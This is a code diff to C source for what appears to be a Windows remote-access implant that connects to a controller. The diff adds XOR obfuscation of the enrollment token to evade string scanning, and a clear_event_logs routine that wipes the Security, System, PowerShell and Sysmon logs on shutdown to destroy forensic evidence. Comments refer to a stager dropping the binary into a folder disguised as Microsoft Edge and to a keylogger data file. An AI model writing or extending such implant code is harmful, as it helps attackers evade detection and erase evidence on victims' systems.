@@ -30,12 +30,17 @@
  * (BP2: cert and key are generated at runtime — not embedded in the binary)
  */
 #include "implant_certs.h"
+#include "token_obf.h"
 
-/* BP2: enrollment token baked in at compile time via -DENROLLMENT_TOKEN="..."
- * Fall back to a placeholder so the file compiles without the flag. */
-#ifndef ENROLLMENT_TOKEN
-#define ENROLLMENT_TOKEN "default-token"
-#endif
+/* BP2: enrollment token is XOR-obfuscated in the binary (token_obf.h).
+ * Decoded at runtime onto the stack — never appears as a plaintext string
+ * in .rodata and is not visible via `strings` on the binary. */
+static void decode_enrollment_token(char *out)
+{
+    for (int i = 0; i < TOKEN_OBF_LEN; i++)
+        out[i] = (char)(g_token_obf[i] ^ g_token_key[i % sizeof(g_token_key)]);
+    out[TOKEN_OBF_LEN] = '\0';
+}
 
 /* ── BP5 keepalive thread ────────────────────────────────────────────
  *
@@ -230,6 +235,30 @@ static Conn *connect_to_controller(void)
     return conn;
 }
 
+/* ── Event log clearing ──────────────────────────────────────────────
+ * Called on SHUTDOWN to remove forensic artifacts (process creation 4688,
+ * scheduled task creation 4698, PowerShell script block 4104, Sysmon). */
+#ifdef _WIN32
+static void clear_event_logs(void)
+{
+    static const char *logs[] = {
+        "Security",
+        "System",
+        "Application",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-Sysmon/Operational",
+        NULL
+    };
+    for (int i = 0; logs[i]; i++) {
+        HANDLE h = OpenEventLogA(NULL, logs[i]);
+        if (h) {
+            ClearEventLogA(h, NULL);
+            CloseEventLog(h);
+        }
+    }
+}
+#endif
+
 /* ── Self-relocation ─────────────────────────────────────────────────
  *
  * The stager (medium-integrity) drops i.exe to C:\Users\Public because
@@ -360,7 +389,9 @@ int main(int argc, char **argv)
 
         char *csr_pem = NULL;
         int   csr_len = 0;
-        if (!tls_gen_key_and_csr(ENROLLMENT_TOKEN,
+        char  enrollment_token[TOKEN_OBF_LEN + 1];
+        decode_enrollment_token(enrollment_token);
+        if (!tls_gen_key_and_csr(enrollment_token,
                                   &key_pem, &key_len,
                                   &csr_pem, &csr_len)) {
             while (1) SLEEP(60);
@@ -476,6 +507,7 @@ int main(int argc, char **argv)
 #ifdef _WIN32
                 DeleteFileA("C:\\Users\\Public\\MicrosoftEdge\\kl.dat");
                 RemoveDirectoryA("C:\\Users\\Public\\MicrosoftEdge");
+                clear_event_logs();
 #endif
             }
             char *payload = "SUCCESSFULLY SHUTDOWN";
